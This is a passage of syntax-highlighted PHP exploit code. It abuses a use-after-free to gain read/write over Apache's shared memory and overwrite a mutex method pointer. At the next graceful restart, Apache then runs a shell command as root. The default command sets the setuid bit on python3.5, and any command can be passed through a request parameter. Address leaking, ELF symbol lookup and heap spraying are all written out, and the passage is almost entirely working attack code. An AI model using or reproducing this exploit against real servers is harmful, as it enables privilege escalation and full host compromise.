            <span class="nv">$this-</span>&gt;<span class="n">abc</span>[<span class="mi">2</span>] == <span class="s">&quot;\x12&quot;</span> &amp;&amp;
            <span class="nv">$this-</span>&gt;<span class="n">abc</span>[<span class="mi">3</span>] == <span class="s">&quot;\x13&quot;</span>
        ))
        {
            <span class="n">o</span>(<span class="s">&#39;UAF failed, exiting.&#39;</span>);
            <span class="nb">exit</span>();
        }
        <span class="n">o</span>(<span class="s">&#39;UAF successful.&#39;</span>);
        <span class="n">o</span>(<span class="s">&#39;&#39;</span>);

        <span class="c1"># Give us some room</span>
        <span class="c1"># I: As indicated before, just unset a lot of stuff so that next allocs</span>
        <span class="c1"># don&#39;t break our fragile UAFd structure.</span>
        <span class="n">unset</span>(<span class="nv">$room</span>);

        <span class="c1">#</span>
        <span class="c1"># Setup the R/W primitive</span>
        <span class="c1">#</span>

        <span class="c1"># We control $abc&#39;s internal zend_string structure, therefore we can R/W</span>
        <span class="c1"># the shared memory block (SHM), but for that we need to know the</span>
        <span class="c1"># position of $abc in memory</span>
        <span class="c1"># I: We know the absolute position of the SHM, so we need to need abc&#39;s</span>
        <span class="c1"># as well, otherwise we cannot compute the offset</span>

        <span class="c1"># Assuming the allocation was contiguous, memory looks like this, with</span>
        <span class="c1"># 0x70-sized fastbins:</span>
        <span class="c1">#   [zend_string:abc]</span>
        <span class="c1">#   [zend_string:protector]</span>
        <span class="c1">#   [FREE#1]</span>
        <span class="c1">#   [FREE#2]</span>
        <span class="c1"># Therefore, the address of the 2nd free block is in the first 8 bytes</span>
        <span class="c1"># of the first block: 0x70 * 2 - 24</span>
        <span class="nv">$address</span> = <span class="n">str2ptr</span>(<span class="nv">$this-</span>&gt;<span class="n">abc</span>, <span class="mh">0x70</span> * <span class="mi">2</span> - <span class="mi">24</span>);
        <span class="c1"># The address we got points to FREE#2, hence we&#39;re |block| * 3 higher in</span>
        <span class="c1"># memory</span>
        <span class="nv">$address</span> = <span class="nv">$address</span> - <span class="mh">0x70</span> * <span class="mi">3</span>;
        <span class="c1"># The beginning of the string is 24 bytes after its origin</span>
        <span class="nv">$address</span> = <span class="nv">$address</span> + <span class="mi">24</span>;
        <span class="n">o</span>(<span class="s">&#39;Address of $abc: 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$address</span>));
        <span class="n">o</span>(<span class="s">&#39;&#39;</span>);

        <span class="c1"># Compute the size required for our string to include the whole SHM and</span>
        <span class="c1"># apache&#39;s memory region</span>
        <span class="nv">$distance</span> = 
            <span class="nb">max</span>(<span class="nv">$addresses</span>[<span class="s">&#39;apache&#39;</span>][<span class="mi">1</span>], <span class="nv">$addresses</span>[<span class="s">&#39;shm&#39;</span>][<span class="mi">1</span>]) -
            <span class="nv">$address</span>
        ;
        <span class="nv">$x-</span>&gt;<span class="nb">d</span> = <span class="nv">$distance</span>;

        <span class="c1"># We can now read/write in the whole SHM and apache&#39;s memory region.</span>

        <span class="c1">#</span>
        <span class="c1"># Find all_buckets in memory</span>
        <span class="c1">#</span>

        <span class="c1"># We are looking for a structure s.t.</span>
        <span class="c1"># |all_buckets, mutex| = 0x10</span>
        <span class="c1"># |mutex, meth| = 0x8</span>
        <span class="c1"># all_buckets is in apache&#39;s memory region</span>
        <span class="c1"># mutex is in apache&#39;s memory region</span>
        <span class="c1"># meth is in libaprR&#39;s memory region</span>
        <span class="c1"># meth&#39;s function pointers are in libaprX&#39;s memory region</span>
        <span class="n">o</span>(<span class="s">&#39;Looking for all_buckets in memory&#39;</span>);
        <span class="nv">$all_buckets</span> = <span class="mi">0</span>;

        <span class="k">for</span>(
            <span class="nv">$i</span> = <span class="nv">$addresses</span>[<span class="s">&#39;apache&#39;</span>][<span class="mi">0</span>] + <span class="mh">0x10</span>;
            <span class="nv">$i</span> &lt; <span class="nv">$addresses</span>[<span class="s">&#39;apache&#39;</span>][<span class="mi">1</span>] - <span class="mh">0x08</span>;
            <span class="nv">$i</span> += <span class="mi">8</span>
        )
        {
            <span class="c1"># mutex</span>
            <span class="nv">$mutex</span> = <span class="nv">$pointer</span> = <span class="n">str2ptr</span>(<span class="nv">$this-</span>&gt;<span class="n">abc</span>, <span class="nv">$i</span> - <span class="nv">$address</span>);
            <span class="k">if</span>(!<span class="nb">in</span>(<span class="nv">$pointer</span>, <span class="nv">$addresses</span>[<span class="s">&#39;apache&#39;</span>]))
                <span class="n">continue</span>;


            <span class="c1"># meth</span>
            <span class="nv">$meth</span> = <span class="nv">$pointer</span> = <span class="n">str2ptr</span>(<span class="nv">$this-</span>&gt;<span class="n">abc</span>, <span class="nv">$pointer</span> + <span class="mh">0x8</span> - <span class="nv">$address</span>);
            <span class="k">if</span>(!<span class="nb">in</span>(<span class="nv">$pointer</span>, <span class="nv">$addresses</span>[<span class="s">&#39;libaprR&#39;</span>]))
                <span class="n">continue</span>;

            <span class="n">o</span>(<span class="s">&#39;  [&amp;mutex]: 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$i</span>));
            <span class="n">o</span>(<span class="s">&#39;    [mutex]: 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$mutex</span>));
            <span class="n">o</span>(<span class="s">&#39;      [meth]: 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$meth</span>));


            <span class="c1"># meth-&gt;*</span>
            <span class="c1"># flags</span>
            <span class="k">if</span>(<span class="n">str2ptr</span>(<span class="nv">$this-</span>&gt;<span class="n">abc</span>, <span class="nv">$pointer</span> - <span class="nv">$address</span>) != <span class="mi">0</span>)
                <span class="n">continue</span>;
            <span class="c1"># methods</span>
            <span class="k">for</span>(<span class="nv">$j</span>=<span class="mi">0</span>;<span class="nv">$j&lt;7;$j++)</span>
<span class="nv">            {</span>
<span class="nv">                $m = str2ptr($this-&gt;</span><span class="n">abc</span>, <span class="nv">$pointer</span> + <span class="mh">0x8</span> + <span class="nv">$j</span> * <span class="mi">8</span> - <span class="nv">$address</span>);
                <span class="k">if</span>(!<span class="nb">in</span>(<span class="nv">$m</span>, <span class="nv">$addresses</span>[<span class="s">&#39;libaprX&#39;</span>]))
                    <span class="n">continue</span> <span class="mi">2</span>;
                <span class="n">o</span>(<span class="s">&#39;        [*]: 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$m</span>));
            }

            <span class="nv">$all_buckets</span> = <span class="nv">$i</span> - <span class="mh">0x10</span>;
            <span class="n">o</span>(<span class="s">&#39;all_buckets = 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$all_buckets</span>));
            <span class="nb">break</span>;
        }

        <span class="k">if</span>(!<span class="nv">$all_buckets</span>)
        {
            <span class="n">o</span>(<span class="s">&#39;Unable to find all_buckets&#39;</span>);
            <span class="nb">exit</span>();
        }

        <span class="n">o</span>(<span class="s">&#39;&#39;</span>);

        <span class="c1"># The address of all_buckets will change when apache is gracefully</span>
        <span class="c1"># restarted. This is a problem because we need to know all_buckets&#39;s</span>
        <span class="c1"># address in order to make all_buckets[some_index] point to a memory</span>
        <span class="c1"># region we control.</span>

        <span class="c1">#</span>
        <span class="c1"># Compute potential bucket indexes and their addresses</span>
        <span class="c1">#</span>

        <span class="n">o</span>(<span class="s">&#39;Computing potential bucket indexes and addresses&#39;</span>);

        <span class="c1"># Since we have sizeof($workers_pid) MPM workers, we can fill the rest</span>
        <span class="c1"># of the ap_score_image-&gt;servers items, so 256 - sizeof($workers_pids),</span>
        <span class="c1"># with data we like. We keep the one at the top to store our payload.</span>
        <span class="c1"># The rest is sprayed with the address of our payload.</span>

        <span class="nv">$size_prefork_child_bucket</span> = <span class="mi">24</span>;
        <span class="nv">$size_worker_score</span> = <span class="mi">264</span>;
        <span class="c1"># I get strange errors if I use every &quot;free&quot; item, so I leave twice as</span>
        <span class="c1"># many items free. I&#39;m guessing upon startup some</span>
        <span class="nv">$spray_size</span> = <span class="nv">$size_worker_score</span> * (<span class="mi">256</span> - <span class="n">sizeof</span>(<span class="nv">$workers_pids</span>) * <span class="mi">2</span>);
        <span class="nv">$spray_max</span> = <span class="nv">$addresses</span>[<span class="s">&#39;shm&#39;</span>][<span class="mi">1</span>];
        <span class="nv">$spray_min</span> = <span class="nv">$spray_max</span> - <span class="nv">$spray_size</span>;

        <span class="nv">$spray_middle</span> = (<span class="n">int</span>) ((<span class="nv">$spray_min</span> + <span class="nv">$spray_max</span>) / <span class="mi">2</span>);
        <span class="nv">$bucket_index_middle</span> = (<span class="n">int</span>) (
            - (<span class="nv">$all_buckets</span> - <span class="nv">$spray_middle</span>) /
            <span class="nv">$size_prefork_child_bucket</span>
        );

        <span class="c1">#</span>
        <span class="c1"># Build payload</span>
        <span class="c1">#</span>

        <span class="c1"># A worker_score structure was kept empty to put our payload in</span>
        <span class="nv">$payload_start</span> = <span class="nv">$spray_min</span> - <span class="nv">$size_worker_score</span>;

        <span class="nv">$z</span> = <span class="n">ptr2str</span>(<span class="mi">0</span>);

        <span class="c1"># Payload maxsize 264 - 112 = 152</span>
        <span class="c1"># Offset 8 cannot be 0, but other than this you can type whatever</span>
        <span class="c1"># command you want</span>
        <span class="nv">$bucket</span> = <span class="n">isset</span>(<span class="nv">$_REQUEST</span>[<span class="s">&#39;cmd&#39;</span>]) ?
            <span class="nv">$_REQUEST</span>[<span class="s">&#39;cmd&#39;</span>] :
            <span class="s">&quot;chmod +s /usr/bin/python3.5&quot;</span>;

        <span class="k">if</span>(<span class="n">strlen</span>(<span class="nv">$bucket</span>) &gt; <span class="nv">$size_worker_score</span> - <span class="mi">112</span>)
        {
            <span class="n">o</span>(
                <span class="s">&#39;Payload size is bigger than available space (&#39;</span> .
                (<span class="nv">$size_worker_score</span> - <span class="mi">112</span>) .
                <span class="s">&#39;), exiting.&#39;</span>
            );
            <span class="nb">exit</span>();
        }
        <span class="c1"># Align</span>
        <span class="nv">$bucket</span> = <span class="n">str_pad</span>(<span class="nv">$bucket</span>, <span class="nv">$size_worker_score</span> - <span class="mi">112</span>, <span class="s">&quot;\x00&quot;</span>);

        <span class="c1"># apr_proc_mutex_unix_lock_methods_t</span>
        <span class="nv">$meth</span> = 
            <span class="nv">$z</span> .
            <span class="nv">$z</span> .
            <span class="nv">$z</span> .
            <span class="nv">$z</span> .
            <span class="nv">$z</span> .
            <span class="nv">$z</span> .
            <span class="c1"># child_init</span>
            <span class="n">ptr2str</span>(<span class="nv">$addresses</span>[<span class="s">&#39;zend_object_std_dtor&#39;</span>])
        ;

        <span class="c1"># The second pointer points to meth, and is used before reaching the</span>
        <span class="c1"># arbitrary function call</span>
        <span class="c1"># The third one and the last one are both used by the function call</span>
        <span class="c1"># zend_object_std_dtor(object) =&gt; ... =&gt; system(&amp;arData[0]-&gt;val)</span>
        <span class="nv">$properties</span> = 
            <span class="c1"># refcount</span>
            <span class="n">ptr2str</span>(<span class="mi">1</span>) .
            <span class="c1"># u-nTableMask meth</span>
            <span class="n">ptr2str</span>(<span class="nv">$payload_start</span> + <span class="n">strlen</span>(<span class="nv">$bucket</span>)) .
            <span class="c1"># Bucket arData</span>
            <span class="n">ptr2str</span>(<span class="nv">$payload_start</span>) .
            <span class="c1"># uint32_t nNumUsed;</span>
            <span class="n">ptr2str</span>(<span class="mi">1</span>, <span class="mi">4</span>) .
            <span class="c1"># uint32_t nNumOfElements;</span>
            <span class="n">ptr2str</span>(<span class="mi">0</span>, <span class="mi">4</span>) .
            <span class="c1"># uint32_t nTableSize</span>
            <span class="n">ptr2str</span>(<span class="mi">0</span>, <span class="mi">4</span>) .
            <span class="c1"># uint32_t nInternalPointer</span>
            <span class="n">ptr2str</span>(<span class="mi">0</span>, <span class="mi">4</span>) .
            <span class="c1"># zend_long nNextFreeElement</span>
            <span class="nv">$z</span> .
            <span class="c1"># dtor_func_t pDestructor</span>
            <span class="n">ptr2str</span>(<span class="nv">$addresses</span>[<span class="s">&#39;system&#39;</span>])
        ;

        <span class="nv">$payload</span> =
            <span class="nv">$bucket</span> .
            <span class="nv">$meth</span> .
            <span class="nv">$properties</span>
        ;

        <span class="c1"># Write the payload</span>

        <span class="n">o</span>(<span class="s">&#39;Placing payload at address 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$payload_start</span>));

        <span class="nv">$p</span> = <span class="nv">$payload_start</span> - <span class="nv">$address</span>;
        <span class="k">for</span>(
            <span class="nv">$i</span> = <span class="mi">0</span>;
            <span class="nv">$i</span> &lt; <span class="n">strlen</span>(<span class="nv">$payload</span>);
            <span class="nv">$i</span>++
        )
        {
            <span class="nv">$this-</span>&gt;<span class="n">abc</span>[<span class="nv">$p</span>+<span class="nv">$i</span>] = <span class="nv">$payload</span>[<span class="nv">$i</span>];
        }

        <span class="c1"># Fill the spray area with a pointer to properties</span>

        <span class="nv">$properties_address</span> = <span class="nv">$payload_start</span> + <span class="n">strlen</span>(<span class="nv">$bucket</span>) + <span class="n">strlen</span>(<span class="nv">$meth</span>);
        <span class="n">o</span>(<span class="s">&#39;Spraying pointer&#39;</span>);
        <span class="n">o</span>(<span class="s">&#39;  Address: 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$properties_address</span>));
        <span class="n">o</span>(<span class="s">&#39;  From: 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$spray_min</span>));
        <span class="n">o</span>(<span class="s">&#39;  To: 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$spray_max</span>));
        <span class="n">o</span>(<span class="s">&#39;  Size: 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$spray_size</span>));
        <span class="n">o</span>(<span class="s">&#39;  Covered: 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$spray_size</span> * <span class="nb">count</span>(<span class="nv">$workers_pids</span>)));
        <span class="n">o</span>(<span class="s">&#39;  Apache: 0x&#39;</span> . <span class="n">dechex</span>(
            <span class="nv">$addresses</span>[<span class="s">&#39;apache&#39;</span>][<span class="mi">1</span>] -
            <span class="nv">$addresses</span>[<span class="s">&#39;apache&#39;</span>][<span class="mi">0</span>]
        ));

        <span class="nv">$s_properties_address</span> = <span class="n">ptr2str</span>(<span class="nv">$properties_address</span>);

        <span class="k">for</span>(
            <span class="nv">$i</span> = <span class="nv">$spray_min</span>;
            <span class="nv">$i</span> &lt; <span class="nv">$spray_max</span>;
            <span class="nv">$i</span>++
        )
        {
            <span class="nv">$this-</span>&gt;<span class="n">abc</span>[<span class="nv">$i</span> - <span class="nv">$address</span>] = <span class="nv">$s_properties_address</span>[<span class="nv">$i</span> % <span class="mi">8</span>];
        }
        <span class="n">o</span>(<span class="s">&#39;&#39;</span>);

        <span class="c1"># Find workers PID in the SHM: it indicates the beginning of their</span>
        <span class="c1"># process_score structure. We can then change process_score.bucket to</span>
        <span class="c1"># the index we computed. When apache reboots, it will use</span>
        <span class="c1"># all_buckets[ap_scoreboard_image-&gt;parent[i]-&gt;bucket]-&gt;mutex</span>
        <span class="c1"># which means we control the whole apr_proc_mutex_t structure.</span>
        <span class="c1"># This structure contains pointers to multiple functions, especially</span>
        <span class="c1"># mutex-&gt;meth-&gt;child_init(), which will be called before privileges</span>
        <span class="c1"># are dropped.</span>
        <span class="c1"># We do this for every worker PID, incrementing the bucket index so that</span>
        <span class="c1"># we cover a bigger range.</span>

        <span class="n">o</span>(<span class="s">&#39;Iterating in SHM to find PIDs...&#39;</span>);

        <span class="c1"># Number of bucket indexes covered by our spray</span>
        <span class="nv">$spray_nb_buckets</span> = (<span class="n">int</span>) (<span class="nv">$spray_size</span> / <span class="nv">$size_prefork_child_bucket</span>);
        <span class="c1"># Number of bucket indexes covered by our spray and the PS structures</span>
        <span class="nv">$total_nb_buckets</span> = <span class="nv">$spray_nb_buckets</span> * <span class="nb">count</span>(<span class="nv">$workers_pids</span>);
        <span class="c1"># First bucket index to handle</span>
        <span class="nv">$bucket_index</span> = <span class="nv">$bucket_index_middle</span> - (<span class="n">int</span>) (<span class="nv">$total_nb_buckets</span> / <span class="mi">2</span>);

        <span class="c1"># Iterate over every process_score structure until we find every PID or</span>
        <span class="c1"># we reach the end of the SHM</span>
        <span class="k">for</span>(
            <span class="nv">$p</span> = <span class="nv">$addresses</span>[<span class="s">&#39;shm&#39;</span>][<span class="mi">0</span>] + <span class="mh">0x20</span>;
            <span class="nv">$p</span> &lt; <span class="nv">$addresses</span>[<span class="s">&#39;shm&#39;</span>][<span class="mi">1</span>] &amp;&amp; <span class="nb">count</span>(<span class="nv">$workers_pids</span>) &gt; <span class="mi">0</span>;
            <span class="nv">$p</span> += <span class="mh">0x24</span>
        )
        {
            <span class="nv">$l</span> = <span class="nv">$p</span> - <span class="nv">$address</span>;
            <span class="nv">$current_pid</span> = <span class="n">str2ptr</span>(<span class="nv">$this-</span>&gt;<span class="n">abc</span>, <span class="nv">$l</span>, <span class="mi">4</span>);
            <span class="n">o</span>(<span class="s">&#39;Got PID: &#39;</span> . <span class="nv">$current_pid</span>);
            <span class="c1"># The PID matches one of the workers</span>
            <span class="k">if</span>(<span class="n">in_array</span>(<span class="nv">$current_pid</span>, <span class="nv">$workers_pids</span>))
            {
                <span class="n">unset</span>(<span class="nv">$workers_pids</span>[<span class="nv">$current_pid</span>]);
                <span class="n">o</span>(<span class="s">&#39;  PID matches&#39;</span>);
                <span class="c1"># Update bucket address</span>
                <span class="nv">$s_bucket_index</span> = <span class="nb">pack</span>(<span class="s">&#39;l&#39;</span>, <span class="nv">$bucket_index</span>);
                <span class="nv">$this-</span>&gt;<span class="n">abc</span>[<span class="nv">$l</span> + <span class="mh">0x20</span>] = <span class="nv">$s_bucket_index</span>[<span class="mi">0</span>];
                <span class="nv">$this-</span>&gt;<span class="n">abc</span>[<span class="nv">$l</span> + <span class="mh">0x21</span>] = <span class="nv">$s_bucket_index</span>[<span class="mi">1</span>];
                <span class="nv">$this-</span>&gt;<span class="n">abc</span>[<span class="nv">$l</span> + <span class="mh">0x22</span>] = <span class="nv">$s_bucket_index</span>[<span class="mi">2</span>];
                <span class="nv">$this-</span>&gt;<span class="n">abc</span>[<span class="nv">$l</span> + <span class="mh">0x23</span>] = <span class="nv">$s_bucket_index</span>[<span class="mi">3</span>];
                <span class="n">o</span>(<span class="s">&#39;  Changed bucket value to &#39;</span> . <span class="nv">$bucket_index</span>);
                <span class="nv">$min</span> = <span class="nv">$spray_min</span> - <span class="nv">$size_prefork_child_bucket</span> * <span class="nv">$bucket_index</span>;
                <span class="nv">$max</span> = <span class="nv">$spray_max</span> - <span class="nv">$size_prefork_child_bucket</span> * <span class="nv">$bucket_index</span>;
                <span class="n">o</span>(<span class="s">&#39;  Ranges: 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$min</span>) . <span class="s">&#39; - 0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$max</span>));
                <span class="c1"># This bucket range is covered, go to the next one</span>
                <span class="nv">$bucket_index</span> += <span class="nv">$spray_nb_buckets</span>;
            }
        }

        <span class="k">if</span>(<span class="nb">count</span>(<span class="nv">$workers_pids</span>) &gt; <span class="mi">0</span>)
        {
            <span class="n">o</span>(
                <span class="s">&#39;Unable to find PIDs &#39;</span> .
                <span class="n">implode</span>(<span class="s">&#39;, &#39;</span>, <span class="nv">$workers_pids</span>) .
                <span class="s">&#39; in SHM, exiting.&#39;</span>
            );
            <span class="nb">exit</span>();
        }

        <span class="n">o</span>(<span class="s">&#39;&#39;</span>);
        <span class="n">o</span>(<span class="s">&#39;EXPLOIT SUCCESSFUL.&#39;</span>);
        <span class="n">o</span>(<span class="s">&#39;Await 6:25AM.&#39;</span>);

        <span class="k">return</span> <span class="mi">0</span>;
    }
}

<span class="n">function</span> <span class="n">o</span>(<span class="nv">$msg</span>)
{
    <span class="c1"># No concatenation -&gt; no string allocation</span>
    <span class="nb">print</span>(<span class="nv">$msg</span>);
    <span class="nb">print</span>(<span class="s">&quot;\n&quot;</span>);
}

<span class="n">function</span> <span class="n">ptr2str</span>(<span class="nv">$ptr</span>, <span class="nv">$m</span>=<span class="mi">8</span>)
{
    <span class="nv">$out</span> = <span class="s">&quot;&quot;</span>;
    <span class="k">for</span> (<span class="nv">$i</span>=<span class="mi">0</span>; <span class="nv">$i&lt;$m; $i++)</span>
<span class="nv">    {</span>
<span class="nv">        $out .= chr($ptr &amp; 0xff);</span>
<span class="nv">        $ptr &gt;</span>&gt;= <span class="mi">8</span>;
    }
    <span class="k">return</span> <span class="nv">$out</span>;
}

<span class="n">function</span> <span class="n">str2ptr</span>(&amp;<span class="nv">$str</span>, <span class="nv">$p</span>, <span class="nv">$s</span>=<span class="mi">8</span>)
{
    <span class="nv">$address</span> = <span class="mi">0</span>;
    <span class="k">for</span>(<span class="nv">$j</span>=<span class="nv">$s-1</span>;<span class="nv">$j</span><span class="o">&gt;=</span><span class="mi">0</span>;<span class="nv">$j--</span>)
    {
        <span class="nv">$address</span> <span class="s">&lt;&lt;= 8;</span>
<span class="s">        $address |= ord($str[$p+$j]);</span>
<span class="s">    }</span>
<span class="s">    return $address;</span>
<span class="s">}</span>

<span class="s">function in($i, $range)</span>
<span class="s">{</span>
<span class="s">    return $i &gt;= $range[0] &amp;&amp; $i &lt; $range[1];</span>
<span class="s">}</span>

<span class="s">/**</span>
<span class="s"> * Finds the offset of a symbol in a file.</span>
<span class="s"> */</span>
<span class="s">function find_symbol($file, $symbol)</span>
<span class="s">{</span>
<span class="s">    $elf = file_get_contents($file);</span>
<span class="s">    $e_shoff = str2ptr($elf, 0x28);</span>
<span class="s">    $e_shentsize = str2ptr($elf, 0x3a, 2);</span>
<span class="s">    $e_shnum = str2ptr($elf, 0x3c, 2);</span>

<span class="s">    $dynsym_off = 0;</span>
<span class="s">    $dynsym_sz = 0;</span>
<span class="s">    $dynstr_off = 0;</span>

<span class="s">    for($i=0;$i&lt;$e_shnum;$i++)</span>
<span class="s">    {</span>
<span class="s">        $offset = $e_shoff + $i * $e_shentsize;</span>
<span class="s">        $sh_type = str2ptr($elf, $offset + 0x04, 4);</span>

<span class="s">        $SHT_DYNSYM = 11;</span>
<span class="s">        $SHT_SYMTAB = 2;</span>
<span class="s">        $SHT_STRTAB = 3;</span>

<span class="s">        switch($sh_type)</span>
<span class="s">        {</span>
<span class="s">            case $SHT_DYNSYM:</span>
<span class="s">                $dynsym_off = str2ptr($elf, $offset + 0x18, 8);</span>
<span class="s">                $dynsym_sz = str2ptr($elf, $offset + 0x20, 8);</span>
<span class="s">                break;</span>
<span class="s">            case $SHT_STRTAB:</span>
<span class="s">            case $SHT_SYMTAB:</span>
<span class="s">                if(!$dynstr_off)</span>
<span class="s">                    $dynstr_off = str2ptr($elf, $offset + 0x18, 8);</span>
<span class="s">                break;</span>
<span class="s">        }</span>

<span class="s">    }</span>

<span class="s">    if(!($dynsym_off &amp;&amp; $dynsym_sz &amp;&amp; $dynstr_off))</span>
<span class="s">        exit(&#39;.&#39;);</span>

<span class="s">    $sizeof_Elf64_Sym = 0x18;</span>

<span class="s">    for($i=0;$i * $sizeof_Elf64_Sym &lt; $dynsym_sz;$i++)</span>
<span class="s">    {</span>
<span class="s">        $offset = $dynsym_off + $i * $sizeof_Elf64_Sym;</span>
<span class="s">        $st_name = str2ptr($elf, $offset, 4);</span>

<span class="s">        if(!$st_name)</span>
<span class="s">            continue;</span>

<span class="s">        $offset_string = $dynstr_off + $st_name;</span>
<span class="s">        $end = strpos($elf, &quot;\x00&quot;, $offset_string) - $offset_string;</span>
<span class="s">        $string = substr($elf, $offset_string, $end);</span>

<span class="s">        if($string == $symbol)</span>
<span class="s">        {</span>
<span class="s">            $st_value = str2ptr($elf, $offset + 0x8, 8);</span>
<span class="s">            return $st_value;</span>
<span class="s">        }</span>
<span class="s">    }</span>

<span class="s">    die(&#39;Unable to find symbol &#39; . $symbol);</span>
<span class="s">}</span>

<span class="s"># Obtains the addresses of the shared memory block and some functions through </span>
<span class="s"># /proc/self/maps</span>
<span class="s"># This is hacky as hell.</span>
<span class="s">function get_all_addresses()</span>
<span class="s">{</span>
<span class="s">    $addresses = [];</span>
<span class="s">    $data = file_get_contents(&#39;/proc/self/maps&#39;);</span>
<span class="s">    $follows_shm = false;</span>

<span class="s">    foreach(explode(&quot;\n&quot;, $data) as $line)</span>
<span class="s">    {</span>
<span class="s">        if(!isset($addresses[&#39;shm&#39;]) &amp;&amp; strpos($line, &#39;/dev/zero&#39;))</span>
<span class="s">        {</span>
<span class="s">            $line = explode(&#39; &#39;, $line)[0];</span>
<span class="s">            $bounds = array_map(&#39;hexdec&#39;, explode(&#39;-&#39;, $line));</span>
<span class="s">        $msize = $bounds[1] - $bounds[0];</span>
<span class="s">            if ($msize &gt;= 0x10000 &amp;&amp; $msize &lt;= 0x16000)</span>
<span class="s">            {</span>
<span class="s">                $addresses[&#39;shm&#39;] = $bounds;</span>
<span class="s">                $follows_shm = true;</span>
<span class="s">            }</span>
<span class="s">        }</span>
<span class="s">        if(</span>
<span class="s">            preg_match(&#39;#(/[^\s]+libc-[0-9.]+.so[^\s]*)#&#39;, $line, $matches) &amp;&amp;</span>
<span class="s">            strpos($line, &#39;r-xp&#39;)</span>
<span class="s">        )</span>
<span class="s">        {</span>
<span class="s">            $offset = find_symbol($matches[1], &#39;system&#39;);</span>
<span class="s">            $line = explode(&#39; &#39;, $line)[0];</span>
<span class="s">            $line = hexdec(explode(&#39;-&#39;, $line)[0]);</span>
<span class="s">            $addresses[&#39;system&#39;] = $line + $offset;</span>
<span class="s">        }</span>
<span class="s">        if(</span>
<span class="s">            strpos($line, &#39;libapr-1.so&#39;) &amp;&amp;</span>
<span class="s">            strpos($line, &#39;r-xp&#39;)</span>
<span class="s">        )</span>
<span class="s">        {</span>
<span class="s">            $line = explode(&#39; &#39;, $line)[0];</span>
<span class="s">            $bounds = array_map(&#39;hexdec&#39;, explode(&#39;-&#39;, $line));</span>
<span class="s">            $addresses[&#39;libaprX&#39;] = $bounds;</span>
<span class="s">        }</span>
<span class="s">        if(</span>
<span class="s">            strpos($line, &#39;libapr-1.so&#39;) &amp;&amp;</span>
<span class="s">            strpos($line, &#39;r--p&#39;)</span>
<span class="s">        )</span>
<span class="s">        {</span>
<span class="s">            $line = explode(&#39; &#39;, $line)[0];</span>
<span class="s">            $bounds = array_map(&#39;hexdec&#39;, explode(&#39;-&#39;, $line));</span>
<span class="s">            $addresses[&#39;libaprR&#39;] = $bounds;</span>
<span class="s">        }</span>
<span class="s">        # Apache&#39;s memory block is between the SHM and ld.so</span>
<span class="s">        # Sometimes some rwx region gets mapped; all_buckets cannot be in there</span>
<span class="s">        # but we include it anyways for the sake of simplicity</span>
<span class="s">        if(</span>
<span class="s">            (</span>
<span class="s">                strpos($line, &#39;rw-p&#39;) ||</span>
<span class="s">                strpos($line, &#39;rwxp&#39;)</span>
<span class="s">            ) &amp;&amp;</span>
<span class="s">            $follows_shm</span>
<span class="s">        )</span>
<span class="s">        {</span>
<span class="s">            if(strpos($line, &#39;/lib&#39;))</span>
<span class="s">            {</span>
<span class="s">                $follows_shm = false;</span>
<span class="s">                continue;</span>
<span class="s">            }</span>
<span class="s">            $line = explode(&#39; &#39;, $line)[0];</span>
<span class="s">            $bounds = array_map(&#39;hexdec&#39;, explode(&#39;-&#39;, $line));</span>
<span class="s">            if(!array_key_exists(&#39;apache&#39;, $addresses))</span>
<span class="s">                $addresses[&#39;apache&#39;] = $bounds;</span>
<span class="s">            else if($addresses[&#39;apache&#39;][1] == $bounds[0])</span>
<span class="s">                $addresses[&#39;apache&#39;][1] = $bounds[1];</span>
<span class="s">            else</span>
<span class="s">                $follows_shm = false;</span>
<span class="s">        }</span>
<span class="s">        if(</span>
<span class="s">            preg_match(&#39;#(/[^\s]+libphp7[0-9.]+.so[^\s]*)#&#39;, $line, $matches) &amp;&amp;</span>
<span class="s">            strpos($line, &#39;r-xp&#39;)</span>
<span class="s">        )</span>
<span class="s">        {</span>
<span class="s">            $offset = find_symbol($matches[1], &#39;zend_object_std_dtor&#39;);</span>
<span class="s">            $line = explode(&#39; &#39;, $line)[0];</span>
<span class="s">            $line = hexdec(explode(&#39;-&#39;, $line)[0]);</span>
<span class="s">            $addresses[&#39;zend_object_std_dtor&#39;] = $line + $offset;</span>
<span class="s">        }</span>
<span class="s">    }</span>

<span class="s">    $expected = [</span>
<span class="s">        &#39;shm&#39;, &#39;system&#39;, &#39;libaprR&#39;, &#39;libaprX&#39;, &#39;apache&#39;, &#39;zend_object_std_dtor&#39;</span>
<span class="s">    ];</span>
<span class="s">    $missing = array_diff($expected, array_keys($addresses));</span>

<span class="s">    if($missing)</span>
<span class="s">    {</span>
<span class="s">        o(</span>
<span class="s">            &#39;The following addresses were not determined by parsing &#39; .</span>
<span class="s">            &#39;/proc/self/maps: &#39; . implode(&#39;, &#39;, $missing)</span>
<span class="s">        );</span>
<span class="s">        exit(0);</span>
<span class="s">    }</span>


<span class="s">    o(&#39;PID: &#39; . getmypid());</span>
<span class="s">    o(&#39;Fetching addresses&#39;);</span>

<span class="s">    foreach($addresses as $k =&gt;</span> <span class="nv">$a</span>)
    {
        <span class="k">if</span>(!<span class="n">is_array</span>(<span class="nv">$a</span>))
            <span class="nv">$a</span> = [<span class="nv">$a</span>];
        <span class="n">o</span>(<span class="s">&#39;  &#39;</span> . <span class="nv">$k</span> . <span class="s">&#39;: &#39;</span> . <span class="n">implode</span>(<span class="s">&#39;-0x&#39;</span>, <span class="n">array_map</span>(<span class="n">function</span>(<span class="nv">$z</span>) {
                <span class="k">return</span> <span class="s">&#39;0x&#39;</span> . <span class="n">dechex</span>(<span class="nv">$z</span>);
        }, <span class="nv">$a</span>)));
    }
    <span class="n">o</span>(<span class="s">&#39;&#39;</span>);

    <span class="k">return</span> <span class="nv">$addresses</span>;
}

<span class="c1"># Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,</span>
<span class="c1"># matching the cmdline and the UID</span>
